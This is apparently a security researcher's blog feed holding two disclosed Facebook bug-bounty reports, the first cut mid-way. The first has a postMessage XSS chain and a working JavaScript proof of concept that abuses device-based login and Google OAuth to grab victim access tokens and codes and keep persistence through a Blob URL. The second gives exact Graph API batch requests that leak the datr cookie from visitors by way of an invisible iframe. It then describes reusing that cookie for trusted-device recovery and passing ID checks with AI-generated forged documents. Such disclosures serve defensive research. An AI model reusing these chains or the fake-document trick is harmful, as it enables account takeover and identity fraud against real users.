      'ThirdPartyPaymentProvider.learnMore|&lt;img src="" onerror="alert(document.domain)"/&gt;|b|c|d',
      '*'
    )
  `</span>
<span class="p">},</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p>The compromised <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider</code> iframe then forwards this message to the Facebook iframe.</p>

<p>Because:</p>

<ul>
  <li>The origin is valid (<code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code>)</li>
  <li>The message type is allowed (<code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.learnMore</code>)</li>
</ul>

<p>Facebook injects the supplied HTML directly into the page, resulting in:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JavaScript execution in the context of facebook.com
</code></pre></div></div>

<p>At this point, <code class="language-plaintext highlighter-rouge">document.domain</code> is <code class="language-plaintext highlighter-rouge">facebook.com</code>.</p>

<h3 id="why-this-is-a-self-xss">Why this is a Self-XSS</h3>

<p>Reaching the vulnerable Facebook endpoint requires two parameters:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">user_id</code></li>
  <li><code class="language-plaintext highlighter-rouge">nonce</code></li>
</ul>

<p>The <code class="language-plaintext highlighter-rouge">nonce</code> is not guessable and must be generated server-side and it’s linked to the current logged-in user. To satisfy these conditions, the exploit chain begins with a <strong>login CSRF</strong>, forcing the victim to authenticate into the attacker’s Facebook account. Once logged in, the attacker can reuse their own valid nonce from another session to start the flow.</p>

<h3 id="escalation-to-instagram-account-takeover">Escalation to Instagram Account Takeover</h3>

<p>After achieving Javascript execution on <code class="language-plaintext highlighter-rouge">facebook.com</code>, escalation is straightforward. The attacker can initiate the Instagram OAuth flow:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/oauth/oidc/
  ?app_id=532380490911317
  &amp;redirect_uri=https://business.facebook.com/business/loginpage/igoauth/callback/
  &amp;scope=openid,linking
  &amp;response_type=code
</code></pre></div></div>

<p>When the flow redirects to:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>business.facebook.com/business/loginpage/igoauth/callback/
</code></pre></div></div>

<p>the page runs under the <code class="language-plaintext highlighter-rouge">facebook.com</code> domain.</p>

<p>Because Javascript is already executing in this context, the attacker can read <code class="language-plaintext highlighter-rouge">location.href</code>, extract OAuth codes, and <strong>complete account linking or takeover</strong>.</p>

<h3 id="attack-flow-summary">Attack Flow Summary</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1) Victim is forced to log into the attacker’s Facebook account via a login CSRF

2) Attacker loads the ACH initialization page with a valid attacker `nonce` and `user_id`

3) Facebook embeds `ThirdPartyPaymentProvider.com` inside a privileged iframe

4) An XSS in `ThirdPartyPaymentProvider.com` allows attacker-controlled Javascript execution

5) The compromised iframe sends a `ThirdPartyPaymentProvider.learnMore` message to parent window

6) Facebook injects attacker-supplied HTML, triggering XSS on `facebook.com`

7) Attacker initiates Instagram OAuth flow and steals an authorization code
</code></pre></div></div>

<h3 id="additional-impact-full-facebook-account-takeover-via-device-based-login-abuse">Additional Impact: Full Facebook Account Takeover via Device-Based Login Abuse</h3>

<p>After further testing, it was possible to escalate the existing XSS into a <strong>full Facebook account takeover</strong>, not only Instagram or Workplace.</p>

<p>This scenario abuses two Facebook behaviors that become reachable once JavaScript execution is achieved in the context of <code class="language-plaintext highlighter-rouge">facebook.com</code>:</p>
<ul>
  <li>The widespread usage of <strong>“Save Login” / device-based login</strong></li>
  <li>The ability to keep a malicious page alive using a <strong>Blob URL</strong>, preventing Facebook from refreshing or invalidating the session</li>
</ul>

<h4 id="scenario-1-device-switch-abuse">Scenario 1: Device-Switch abuse</h4>

<p>Most Facebook users have the <strong>Save Login</strong> feature enabled on at least one device. When this is the case, Facebook exposes <em>device-switchable accounts</em> through a GraphQL query. From the attacker account, after triggering the XSS:</p>

<ul>
  <li>A GraphQL query can be issued to fetch **device-switchable accounts **</li>
  <li>Knowing the real victim account id, and if it’s saved, it’s possible to send a POST request to the device-based login endpoint</li>
  <li>The login occurs without password, 2FA, or user interaction</li>
</ul>

<p>To ensure persistence, the XSS payload is loaded into a <strong>Blob URL</strong>, preventing Facebook from reloading or navigating away from the compromised execution context.</p>

<h4 id="scenario-2-google-oauth-login">Scenario 2: Google OAuth login</h4>

<p>If no device-switchable accounts are found, an alternative path still exists.</p>

<p>The attacker can:</p>

<ul>
  <li>Trigger a Google OAuth flow via <code class="language-plaintext highlighter-rouge">accounts.google.com</code></li>
  <li>Capture the authorization code after redirection to Facebook</li>
  <li>Associate the Google login code with the victim <code class="language-plaintext highlighter-rouge">user_id</code> or <code class="language-plaintext highlighter-rouge">cuid</code></li>
  <li>Retry authentication until Facebook offers <strong>“Continue with Google”</strong> as a fallback</li>
</ul>

<p>This technique works <strong>without user interaction</strong> if the victim is logged into <strong>only one Google account</strong> in their browser.</p>

<h3 id="proof-of-concept">Proof of Concept</h3>

<p>The following PoC was successfully tested and demonstrates both attack paths.<br />
All execution occurs <strong>after XSS is already achieved</strong> in the Facebook context.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>code = `
<span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;script&gt;</span>
    <span class="kd">const</span> <span class="nx">getDeviceAccounts</span> <span class="o">=</span> <span class="p">(</span><span class="nx">attacker_dtsg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://m.facebook.com/api/graphql/</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
          <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">,</span>
        <span class="p">},</span>
        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="s2">`__a=1&amp;fb_dtsg=</span><span class="p">${</span><span class="nx">attacker_dtsg</span><span class="p">}</span><span class="s2">&amp;doc_id=3114557815333936&amp;variables={}`</span><span class="p">,</span>
      <span class="p">})</span>
        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
          <span class="k">try</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">post_data</span> <span class="o">=</span> <span class="nx">e</span>
              <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login/device-based/login/","inputs":[</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
              <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">]</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>

            <span class="kd">const</span> <span class="nx">data_json</span> <span class="o">=</span> <span class="p">{};</span>
            <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="s2">`[</span><span class="p">${</span><span class="nx">post_data</span><span class="p">}</span><span class="s2">]`</span><span class="p">).</span><span class="nf">forEach</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
              <span class="nx">data_json</span><span class="p">[</span><span class="nx">e</span><span class="p">.</span><span class="nx">name</span><span class="p">]</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
            <span class="p">});</span>

            <span class="k">return</span> <span class="nx">data_json</span><span class="p">;</span>
          <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">"</span><span class="s2">No device switchable accounts found!</span><span class="dl">"</span><span class="p">);</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">});</span>
    <span class="p">};</span>

    <span class="kd">const</span> <span class="nx">loginAsVictim</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://m.facebook.com/login/device-based/login/</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">redirect</span><span class="p">:</span> <span class="dl">"</span><span class="s2">manual</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
          <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">,</span>
        <span class="p">},</span>
        <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nf">toString</span><span class="p">(),</span>
      <span class="p">}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">());</span>
    <span class="p">};</span>

    <span class="kd">const</span> <span class="nx">getFirstPartyAccessToken</span> <span class="o">=</span> <span class="p">(</span><span class="nx">dtsg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://m.facebook.com/dialog/oauth</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
          <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">,</span>
        <span class="p">},</span>
        <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">({</span>
          <span class="na">jazoest</span><span class="p">:</span> <span class="dl">"</span><span class="s2">25620</span><span class="dl">"</span><span class="p">,</span>
          <span class="na">fb_dtsg</span><span class="p">:</span> <span class="nx">dtsg</span><span class="p">,</span>
          <span class="na">force_confirmation</span><span class="p">:</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">,</span>
          <span class="na">display</span><span class="p">:</span> <span class="dl">"</span><span class="s2">async</span><span class="dl">"</span><span class="p">,</span>
          <span class="na">__a</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">,</span>
          <span class="na">client_id</span><span class="p">:</span> <span class="dl">"</span><span class="s2">124024574287414</span><span class="dl">"</span><span class="p">,</span>
          <span class="na">redirect_uri</span><span class="p">:</span>
            <span class="dl">"</span><span class="s2">https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46#origin=https://www.instagram.com&amp;relation=opener</span><span class="dl">"</span><span class="p">,</span>
          <span class="na">response_type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">token</span><span class="dl">"</span><span class="p">,</span>
        <span class="p">}),</span>
      <span class="p">})</span>
        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span>
          <span class="nx">e</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">relation=opener&amp;access_token=</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="p">)</span>
        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">token</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
          <span class="nb">window</span><span class="p">.</span><span class="nf">prompt</span><span class="p">(</span><span class="dl">"</span><span class="s2">access_token:</span><span class="dl">"</span><span class="p">,</span> <span class="nx">token</span><span class="p">);</span>
        <span class="p">});</span>
    <span class="p">};</span>

    <span class="kd">const</span> <span class="nx">getDtsg</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://m.facebook.com/dialog/oauth</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
      <span class="p">})</span>
        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
        <span class="p">.</span><span class="nf">then</span><span class="p">(</span>
          <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span>
            <span class="nx">e</span>
              <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">["MRequestConfig",[],{"dtsg":{"token":"</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
              <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="p">);</span>
    <span class="p">};</span>

    <span class="kd">const</span> <span class="nx">wait</span> <span class="o">=</span> <span class="p">(</span><span class="nx">time</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nf">resolve</span><span class="p">(</span><span class="kc">true</span><span class="p">),</span> <span class="nx">time</span><span class="p">);</span>
      <span class="p">});</span>
    <span class="p">};</span>

    <span class="kd">const</span> <span class="nx">getGoogleLoginCode</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Trying to get Google code</span><span class="dl">"</span><span class="p">);</span>
      <span class="nb">document</span><span class="p">.</span><span class="nx">domain</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">facebook.com</span><span class="dl">"</span><span class="p">;</span>

      <span class="kd">const</span> <span class="nx">wnd</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span>
        <span class="dl">"</span><span class="s2">https://accounts.google.com/o/oauth2/auth</span><span class="dl">"</span> <span class="o">+</span>
          <span class="dl">"</span><span class="s2">?client_id=15057814354-80cg059cn49j6kmhhkjam4b00on1gb2n.apps.googleusercontent.com</span><span class="dl">"</span> <span class="o">+</span>
          <span class="dl">"</span><span class="s2">&amp;response_type=code</span><span class="dl">"</span> <span class="o">+</span>
          <span class="dl">"</span><span class="s2">&amp;redirect_uri=https%3A%2F%2Fwww.facebook.com%2Foauth2%2Fredirect%2F</span><span class="dl">"</span> <span class="o">+</span>
          <span class="dl">"</span><span class="s2">&amp;scope=openid+email</span><span class="dl">"</span>
      <span class="p">);</span>

      <span class="nf">wait</span><span class="p">(</span><span class="mi">4000</span><span class="p">).</span><span class="nf">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
          <span class="kd">const</span> <span class="nx">google_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span>
            <span class="nx">wnd</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span>
          <span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">code</span><span class="dl">"</span><span class="p">);</span>
          <span class="nb">window</span><span class="p">.</span><span class="nf">prompt</span><span class="p">(</span><span class="dl">"</span><span class="s2">google code:</span><span class="dl">"</span><span class="p">,</span> <span class="nx">google_code</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
      <span class="p">});</span>
    <span class="p">};</span>

    <span class="nf">getDtsg</span><span class="p">().</span><span class="nf">then</span><span class="p">((</span><span class="nx">attacker_dtsg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="nf">getDeviceAccounts</span><span class="p">(</span><span class="nx">attacker_dtsg</span><span class="p">).</span><span class="nf">then</span><span class="p">((</span><span class="nx">data_post</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">data_post</span><span class="p">)</span> <span class="p">{</span>
          <span class="nf">loginAsVictim</span><span class="p">(</span><span class="nx">data_post</span><span class="p">).</span><span class="nf">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nf">getDtsg</span><span class="p">().</span><span class="nf">then</span><span class="p">((</span><span class="nx">victim_dtsg</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
              <span class="nf">getFirstPartyAccessToken</span><span class="p">(</span><span class="nx">victim_dtsg</span><span class="p">);</span>
            <span class="p">});</span>
          <span class="p">});</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
          <span class="nf">getGoogleLoginCode</span><span class="p">();</span>
        <span class="p">}</span>
      <span class="p">});</span>
    <span class="p">});</span>
  <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/html&gt;</span>
`;

const blob = new Blob([code], {
type: "text/html",
});
window.location.href = URL.createObjectURL(blob);
</code></pre></div></div>

<p>This second scenario demonstrates that once JavaScript execution is achieved on <code class="language-plaintext highlighter-rouge">facebook.com</code>, the impact is <strong>not limited to linked platforms</strong>.</p>

<p>Under realistic conditions, the attacker can:</p>

<ul>
  <li>Bypass passwords and 2FA</li>
  <li>Hijack saved login sessions</li>
  <li>Fully takeover the victim’s Facebook account</li>
  <li>Maintain persistence without page reloads</li>
</ul>

<p>Combined with the original XSS vector, this results in a <strong>complete cross-platform account compromise</strong>.</p>

<h2 id="impact">Impact</h2>
<hr />
<p><br />
The immediate impact is <strong>account takeover</strong> of Facebook, Instagram and Workplace accounts by only visiting attacker website.  However, the broader implication is more severe. This vulnerability effectively allows <strong>ThirdPartyPaymentProvider.com to execute JavaScript in the context of facebook.com</strong> remotly.</p>

<p>A malicious actor could target ThirdPartyPaymentProvider infrastructure to inject a stored payload that automatically compromises <strong>any Facebook user attempting to add a payment method</strong>.</p>

<p>Such an attack would:</p>

<ul>
  <li>Require no user interaction</li>
  <li>Affect Facebook, Instagram, and Workplace users</li>
  <li>Trigger during routine billing actions the user takes</li>
</ul>

<p>Due to the potential scale and impact, further exploitation was intentionally avoided.</p>

<h2 id="timeline">Timeline</h2>
<hr />
<p><br />
Oct 18, 2024 — Bug reported</p>

<p>Oct 18, 2024 — Bug Acknowledged by Facebook</p>

<p>Nov 19, 2024 — Bug Fixed by Facebook</p>

<p>Nov 20, 2024 — <strong>$62,500</strong> bounty awarded by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction Facebook’s payments and billing flows rely heavily on third-party financial service providers. To facilitate bank-based payments, Facebook embeds external services inside privileged Facebook pages and allows cross-window communication between those services and facebook.com.]]></summary></entry><entry><title type="html">Datr cookie theft and AI leads to Facebook account takeover via trusted device recovery</title><link href="http://localhost:4000/uncategorized/2026/01/15/steal-dtsg-cookie.html" rel="alternate" type="text/html" title="Datr cookie theft and AI leads to Facebook account takeover via trusted device recovery" /><published>2026-01-15T00:00:00+02:00</published><updated>2026-01-15T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/15/steal-dtsg-cookie</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/15/steal-dtsg-cookie.html"><![CDATA[<h2 id="introduction">Introduction</h2>
<hr />
<p><br />
Facebook relies on long-lived device identifiers to reduce friction for returning users and to distinguish legitimate activity from suspicious logins. Over time, devices that repeatedly authenticate to the same account are treated as trusted, allowing Facebook to relax certain security requirements during sensitive flows such as account recovery.</p>

<p>One of the core identifiers used for this purpose is the <code class="language-plaintext highlighter-rouge">datr</code> cookie. This cookie is designed to uniquely identify a browser and persists for long periods of time. Once a browser accumulates sufficient trust, Facebook treats possession of this cookie as strong evidence that the device belongs to the legitimate account owner.</p>

<p>This report describes a vulnerability that allows an attacker to steal the <code class="language-plaintext highlighter-rouge">datr</code> cookie from a victim’s browsing session and reuse it to impersonate a trusted device. By abusing Facebook’s trusted device account recovery flow, the attacker can bypass passwords and two-factor authentication and fully take over the victim’s account.</p>

<h2 id="description">Description</h2>
<hr />
<h3 id="trusted-devices-and-account-recovery">Trusted Devices and Account Recovery</h3>
<p>When a user initiates account recovery at: <code class="language-plaintext highlighter-rouge">https://www.facebook.com/recover/account/</code></p>

<p>Facebook typically requires verification through an email address or phone number associated with the account. However, when the request originates from a trusted device, Facebook offers an alternative path for users who claim they no longer have access to those contact methods.</p>

<p>In this case, the platform allows recovery through identity verification by uploading a document. This flow is largely automated and is intended to help legitimate users regain access when traditional recovery options are unavailable.</p>

<p>The security of this flow relies entirely on the assumption that a trusted device cannot be easily impersonated.</p>

<h3 id="leaking-the-datr-cookie-via-oauth-and-graph-api">Leaking the DATR Cookie via OAuth and Graph API</h3>

<p>The vulnerability originates from the interaction between Facebook’s OAuth implementation and the Graph API.</p>

<p>By creating a legitimate Facebook application and enabling Facebook Login, an attacker can generate OAuth authorization codes and access tokens using documented flows. Under specific conditions, exchanging an OAuth authorization code while a <code class="language-plaintext highlighter-rouge">datr</code> cookie is present causes Facebook to include a parameter named <code class="language-plaintext highlighter-rouge">machine_id</code> in the response.</p>

<p>This <code class="language-plaintext highlighter-rouge">machine_id</code> value directly corresponds to the browser’s datr cookie.</p>

<p>While this response is not directly readable cross-origin, Facebook’s <code class="language-plaintext highlighter-rouge">batch API</code> allows chaining multiple Graph API requests and referencing fields from earlier responses. By abusing this behavior, the attacker can propagate the <code class="language-plaintext highlighter-rouge">machine_id</code> value into attacker-controlled output, such as a Facebook Page post.</p>

<p>As a result, a sensitive device identifier that should remain confidential is exposed to the attacker.</p>

<h3 id="attack-flow-summary">Attack Flow Summary</h3>

<h4 id="preparation">Preparation</h4>
<hr />
<p><br />
1) Create a Facebook Page</p>

<p>2) Create a Facebook App noted <code class="language-plaintext highlighter-rouge">ATTACKER_APP_ID</code></p>

<p>3) Allow Facebook Login for the app</p>

<p>4) Visit link below and you should retrieve an access_token noted <code class="language-plaintext highlighter-rouge">ACCESS_TOKEN</code> :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/dialog/oauth?
<span class="err">&amp;</span>app_id=ATTACKED_APP_ID
<span class="err">&amp;</span>redirect_uri=EXACT_REDIRECT_URI
<span class="err">&amp;</span>response_type=token
</code></pre></div></div>

<p>5) Visit link below and it should return an access_token noted <code class="language-plaintext highlighter-rouge">LONG_LIVED_ACCESS_TOKEN</code> :</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.facebook.com/oauth/access_token?
<span class="err">&amp;</span>client_id=ATTACKER_APP_ID
<span class="err">&amp;</span>client_secret=ATTACKER_APP_SECRET
<span class="err">&amp;</span>redirect_uri=EXACT_REDIRECT_URI
<span class="err">&amp;</span>method=post
<span class="err">&amp;</span>fb_exchange_token=ACCESS_TOKEN
</code></pre></div></div>

<p>6) Visit link below and it should return an OAuth code noted <code class="language-plaintext highlighter-rouge">ATTACKER_CODE</code> :</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.facebook.com/oauth/client_code?
<span class="err">&amp;</span>client_id=ATTACKER_APP_ID
<span class="err">&amp;</span>client_secret=ATTACKER_APP_SECRET
<span class="err">&amp;</span>redirect_uri=EXACT_REDIRECT_URI
<span class="err">&amp;</span>method=post
<span class="err">&amp;</span>access_token=LONG_LIVED_ACCESS_TOKEN
</code></pre></div></div>

<h4 id="attack">Attack</h4>
<hr />
<p><br />
1) We’ll use the <strong>ATTACKER_CODE</strong> mentioned above in this request:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.facebook.com/oauth/access_token?
<span class="err">&amp;</span>client_id=ATTACKER_APP_ID
<span class="err">&amp;</span>redirect_uri=REDIRECT_URI
<span class="err">&amp;</span>method=get
<span class="err">&amp;</span>code=ATTACKER_CODE
</code></pre></div></div>

<p>If you navigate to this URL, while logged-in/logged-out on Facebook ( and assuming <code class="language-plaintext highlighter-rouge">datr</code> cookie is set ), this would return the <code class="language-plaintext highlighter-rouge">datr</code> cookie in the response inside a parameter named <code class="language-plaintext highlighter-rouge">machine_id</code></p>

<p><code class="language-plaintext highlighter-rouge">PS: The ATTACKER_CODE could be used once, so every time redo only step 6 from preparation above</code></p>

<p>2) In order to leak the response of the previous request, we’ll use <code class="language-plaintext highlighter-rouge">BATCH</code> requests, we’ll get the <code class="language-plaintext highlighter-rouge">machine_id</code> from the response and pass it to , For example, to another edge that make a page post:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.facebook.com/?
<span class="err">&amp;</span>batch=
[
  {
    "method": "post",
    "omit_response_on_success": 0,
    "relative_url": "/oauth/access_token?client_id=ATTACKER_APP_ID%26redirect_uri=EXACT_REDIRECT_URI",
    "body": "code=ATTACKER_CODE",
    "name": "test"
  },
  {
    "method": "post",
    "relative_url": "ATTACKER_PAGE_ID/posts",
    "body": "message={result=test:$.machine_id}"
  }
]
<span class="err">&amp;</span>access_token=ATTACKER_PAGE_TOKEN
<span class="err">&amp;</span>method=post
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">PS: I used the creation of a page post to log victim's datr cookie, but many other ways can be used, like querying an external website, by using a picture upload via url. This was the simplest way for a proof of concept :)</code></p>

<p>To steal the <code class="language-plaintext highlighter-rouge">datr</code> cookie, the attacker embeds the crafted Graph API batch url above inside an invisible iframe hosted on any website.</p>

<p>When a victim visits the page, the browser automatically fetchs the url with the <code class="language-plaintext highlighter-rouge">datr</code> cookie included in the request ( <code class="language-plaintext highlighter-rouge">SameSite=None</code> ). The request returns the <code class="language-plaintext highlighter-rouge">datr</code> cookie value inside <code class="language-plaintext highlighter-rouge">machine_id</code> and the batch request exfiltrates it and send it to the attacker. No user interaction is required beyond visiting the page.</p>

<h3 id="reusing-the-cookie-to-impersonate-a-trusted-device">Reusing the Cookie to Impersonate a Trusted Device</h3>

<p>Once the attacker obtains the stolen <code class="language-plaintext highlighter-rouge">datr</code> value, they inject it into a fresh browser session and navigate to facebook.com. From Facebook’s perspective, the attacker is now using a trusted device associated with the victim.</p>

<p>At this point, the attacker initiates the account recovery flow and supplies the victim’s user ID. When prompted to confirm account ownership, the attacker selects the option indicating that they no longer have access to the email or phone number.</p>

<p>Because the request originates from a trusted device, Facebook proceeds with identity verification instead of blocking the recovery attempt.</p>

<h3 id="abusing-identity-verification">Abusing Identity Verification</h3>

<p>The identity verification step requires uploading a document that matches the victim’s personal details. The information required for verification typically includes the victim’s full name, date of birth, and country of origin.</p>

<p>In practice, this information is often obtainable from public Facebook profile data, historical posts, the “About” section, or external data sources that have aggregated leaked personal information.</p>

<p>Using AI-powered document generation services, an attacker can create a synthetic but plausible identity document, such as a visa. Testing confirmed that such documents are accepted by the automated verification system.</p>

<p>Once the document is approved, Facebook allows the attacker to add a new email address to the account. This occurs within minutes and does not require extended manual review.</p>

<h2 id="impact">Impact</h2>
<hr />
<p><br />
This vulnerability enables full Facebook account takeover by combining cookie theft with trusted device recovery. It bypasses passwords, two-factor authentication, and relies on identity verification mechanisms that assume possession of a trusted device implies legitimacy.</p>

<p>Once the <code class="language-plaintext highlighter-rouge">datr</code> cookie is compromised, the attacker effectively controls the account recovery process.</p>

<h2 id="timeline">Timeline</h2>
<hr />
<p><br />
